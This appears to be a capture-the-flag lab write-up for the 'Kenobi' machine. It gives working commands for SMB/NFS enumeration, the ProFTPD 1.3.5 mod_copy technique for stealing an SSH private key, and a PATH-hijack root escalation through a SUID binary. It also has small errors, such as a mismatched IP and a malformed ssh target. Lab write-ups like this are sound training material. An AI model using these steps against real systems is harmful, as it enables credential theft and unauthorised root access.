# Kenobi (ProFTPd and SUID)

### **Kenobi** <a href="#edf9y42km77c" id="edf9y42km77c"></a>

* Access a Samba share, manipulate a vulnerable version of proftpd to gain initial access and escalate privileges to root via an SUID binary.

### **Enumerate Samba for Shares** <a href="#hfwdysgt6omq" id="hfwdysgt6omq"></a>

* Samba is standard Windows interoperability suite for Linux.
* Allows users to access files, printers.
* AKA network file system.
* Based on client / server protocol of Server Message Block (SMB).
  * SMB only developed for Windows.
* SMB uses TCP/445 and TCP/139.

| **Port** | **Usage**                                                                                                                                     |
| -------- | --------------------------------------------------------------------------------------------------------------------------------------------- |
| 139      | SMB originally ran on top of NetBIOS using port 139. NetBIOS is older transport layer that allows Windows to talk to another on same network. |
| 445      | Later versions of SMB (after Windows 2000) use port 445 on top of TCP stack. Using TCP allows SMB to work over the Internet.                  |

**1. Enumerate target for SMB Shares**

nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse -oN 10.10.233.83\_smb\_scan.nmap 10.10.233.83

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-22 09:16 GMT

Nmap scan report for 10.10.233.83

Host is up (0.023s latency).

PORT STATE SERVICE

445/tcp open microsoft-ds

Host script results:

\| smb-enum-shares:

\| account\_used: guest

\| \\\10.10.233.83\IPC$:

\| Type: STYPE\_IPC\_HIDDEN

\| Comment: IPC Service (kenobi server (Samba, Ubuntu))

\| Users: 2

\| Max Users: \<unlimited>

\| Path: C:\tmp

\| Anonymous access: READ/WRITE

\| Current user access: READ/WRITE

\| \\\10.10.233.83\anonymous:

\| Type: STYPE\_DISKTREE

\| Comment:

\| Users: 0

\| Max Users: \<unlimited>

\| Path: C:\home\kenobi\share

\| Anonymous access: READ/WRITE

\| Current user access: READ/WRITE

\| \\\10.10.233.83\print$:

\| Type: STYPE\_DISKTREE

\| Comment: Printer Drivers

\| Users: 0

\| Max Users: \<unlimited>

\| Path: C:\var\lib\samba\printers

\| Anonymous access: \<none>

|\_ Current user access: \<none>

Nmap done: 1 IP address (1 host up) scanned in 4.55 seconds

* "smbclient" already intalled on most Linux distributions.

**2. Inspect \anonymous share**

smbclient //10.10.233.83/anonymous

**3. Recursively download \anonymous share**

* Submit username and password as nothing.

smbget -R smb://10.10.233.83/anonymous

Password for \[guest] connecting to //anonymous/10.10.233.83:

Using workgroup WORKGROUP, user guest

smb://10.10.233.83/anonymous/log.txt

Downloaded 11.95kB in 3 seconds

* Nmap port scan of target showed that TCP/111 is running rpcbind service.
* rpcbind is server that converts remote procedure call (RPC) program number into universal addresses.
* When RPC service is started it tells rpcbind the address at which it is listening and the RPC program number it is prepared to serve.
  * TCP/111 gives access to NFS in this use case.

**4. Use nmap scripts to enumerate NFS**

nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.233.83

PORT STATE SERVICE

111/tcp open rpcbind

\| nfs-ls: Volume /var

\| access: Read Lookup NoModify NoExtend NoDelete NoExecute

\| PERMISSION UID GID SIZE TIME FILENAME

\| rwxr-xr-x 0 0 4096 2019-09-04T08:53:24 .

\| rwxr-xr-x 0 0 4096 2019-09-04T12:27:33 ..

\| rwxr-xr-x 0 0 4096 2019-09-04T12:09:49 backups

\| rwxr-xr-x 0 0 4096 2019-09-04T10:37:44 cache

\| rwxrwxrwt 0 0 4096 2019-09-04T08:43:56 crash

\| rwxrwsr-x 0 50 4096 2016-04-12T20:14:23 local

\| rwxrwxrwx 0 0 9 2019-09-04T08:41:33 lock

\| rwxrwxr-x 0 108 4096 2019-09-04T10:37:44 log

\| rwxr-xr-x 0 0 4096 2019-01-29T23:27:41 snap

\| rwxr-xr-x 0 0 4096 2019-09-04T08:53:24 www

|\_

\| nfs-showmount:

|\_ /var \*

\| nfs-statfs:

\| Filesystem 1K-blocks Used Available Use% Maxfilesize Maxlink

|\_ /var 9204224.0 1836520.0 6877108.0 22% 16.0T 32000

MAC Address: 02:51:8B:05:9C:4F (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.94 seconds

### **Gain Initial Access with ProFtpd** <a href="#fdv9zlovt02j" id="fdv9zlovt02j"></a>

* ProFtpd is OSS FTP server for Linux and Windows.
* Vulnerable in past software versions.

**1. Get version of ProFtpd using netcat.**

nc 10.10.233.83 21

220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) \[10.10.233.83]

**2. Use searchsploit to find exploits**

* Searchsploit is CLI search tool for exploit-db.com

searchsploit proftpd 1.3.5

\---------------------------------------------- ---------------------------------

Exploit Title | Path

\---------------------------------------------- ---------------------------------

ProFTPd 1.3.5 - 'mod\_copy' Command Execution | linux/remote/37262.rb

ProFTPd 1.3.5 - 'mod\_copy' Remote Command Exe | linux/remote/36803.py

ProFTPd 1.3.5 - 'mod\_copy' Remote Command Exe | linux/remote/49908.py

ProFTPd 1.3.5 - File Copy | linux/remote/36742.txt

\---------------------------------------------- ---------------------------------

Shellcodes: No Results

* ProFtpd 1.3.5[ mod\_copy module](http://www.proftpd.org/docs/contrib/mod\_copy.html) vulnerable to exploit.
* mod\_copy implements **SITE CPFR** and **SITE CPTO** commands.
* Unauthenticated client can use commands to copy files from remote filesystem to chosen destination.
* log.txt shows that FTP service is running as Kenobi user in this example.

\# Set the user and group under which the server will run.

User kenobi

Group kenobi

* log.txt shows that SSH key generated for Kenobi user.

Your identification has been saved in /home/kenobi/.ssh/id\_rsa.

Your public key has been saved in /home/kenobi/.ssh/id\_rsa.pub.

The key fingerprint is:

SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi

**3. Copy Private key Using SITE CPFR and SITE CPTO Commands.**

nc 10.10.233.83 21

220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) \[10.10.233.83]

SITE CPFR /home/kenobi/.ssh/id\_rsa

350 File or directory exists, ready for destination name

* Earlier nmap NFS enumeration scan showed that /var directory is mounted.
* Copy Kenobi's private key to /var/tmp directory.

SITE CPTO /var/tmp/id\_rsa

250 Copy successful

**4. Mount /var/tmp Directory**

* Create network mount.

mkdir /mnt/kenobi\_nfs

mount 10.10.233.82:/var /mnt/kenobi\_nfs

ls -la /mnt/kenobi\_nfs

**5. Get Private Key.**

cp /mnt/kenobi\_nfs/tmp/id\_rsa .

sudo chmod 600 id\_rsa

**6. Login to Kenobi user's account.**

ssh -i id\_rsa kenobi\_10.10.233.83

* \-i selects identify file (private key).

### **Privilege Escalation with Path Variable Manipulation** <a href="#id-7pt9ukc0i0k6" id="id-7pt9ukc0i0k6"></a>

* ![LN2uOCJ](<../.gitbook/assets/0 (6).png>)

| **Permission** | **On Files**                                         | **On Directories**                                        |
| -------------- | ---------------------------------------------------- | --------------------------------------------------------- |
| SUID bit       | User executes file with permissions of _file_ owner. |                                                           |
| SGID bit       | User executes file with permission of _group_ owner. | File created in directory gets the same group owner.      |
| Sticky bit     | No meaning                                           | Users are prevented from deleting files from other users. |

* SUID (Set owner User ID up on execution) bits can be extremely dangerous.
* Some binaries such as passwd must be run with elevated privileges to rest a user's password.
* Other custom files with SUID bit set can lead to issues.

**1. Search system for binaries with SUID bit set.**

find / -perm -u=s -type f 2>/dev/null

* "/usr/bin/menu" binary does not usually have SUID permissions.
* Running binary provides three options.

/usr/bin/menu

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

1\. status check

2\. kernel version

3\. ifconfig

\*\* Enter your choice :

* strings command searches for human readable strings on a binary.

**2. Run strings against \`/usr/bin/menu/'.**

* Binary is running without a full path.
  * E.g. not using /usr/bin/curl or /usr/bin/uname.

strings /usr/bin/menu

\[...snip...]

curl -I localhost

uname -r

ifconfig

\[...snip...]

* Binary runs with root privileges.

ls -la /usr/bin/menu

\-rwsr-xr-x 1 root root 8880 Sep 4 2019 /usr/bin/menu

**3. Manipulate PATH to gain Root Shell.**

* Copy /bin/sh shell and call it curl.

echo /bin/sh > curl

* Give new binary the correct permissions.

chmod 777 curl

* Put new binary's location in PATH.

export PATH=/home/kenobi:$PATH

* \`/usr/bin/menu\` binary now uses path variable to find \`curl\` binary.
  * \`curl\` is copy of \`/usr/sh\`.
* Shell runs as root as \`/usr/bin/menu\` binary runs as root.

/usr/bin/menu

1. status check
2. kernel version
3. ifconfig \*\* Enter your choice :1

id

uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
